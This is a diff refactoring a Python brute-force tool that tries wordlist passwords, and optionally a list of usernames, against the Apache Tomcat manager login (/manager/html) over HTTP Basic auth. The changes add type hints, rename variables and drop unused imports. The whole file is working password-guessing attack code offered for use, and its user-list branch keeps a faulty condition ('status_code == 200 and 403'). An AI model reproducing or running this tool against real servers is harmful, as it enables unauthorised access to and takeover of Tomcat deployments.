@@ -1,23 +1,21 @@
 import argparse
 import requests
 from requests.auth import HTTPBasicAuth
-from rich.console import Console
 from tqdm import tqdm
 from termcolor import *
-from rich.text import Text
 
 
 # Brute force mode fonction
-def brute(url, userlist, wordlist):
-    userlist = userlist or 'tomcat'
+def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
+
     # without user list
-    if userlist == 'tomcat':
+    if userlist is None:
         with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
             for password in tqdm(open_wordlist):
                 password = password.strip()  # remove space or bad space
                 auth = HTTPBasicAuth('tomcat', password)
-                r = requests.get(f"{url}/manager/html", auth=auth)
-                if r.status_code == 200:
+                response = requests.get(f"{url}/manager/html", auth=auth)
+                if response.status_code == 200:
                     return 'tomcat', password
     # with user list
     else:
@@ -29,8 +27,8 @@ def brute(url, userlist, wordlist):
                     for password in open_wordlist:
                         password = password.strip()  # remove space or bad space
                         auth = HTTPBasicAuth(user, password)
-                        r = requests.get(f"{url}/manager/html", auth=auth)
-                        if r.status_code == 200 and 403:
+                        response = requests.get(f"{url}/manager/html", auth=auth)
+                        if response.status_code == 200 and 403:
                             return user, password
 
     return False
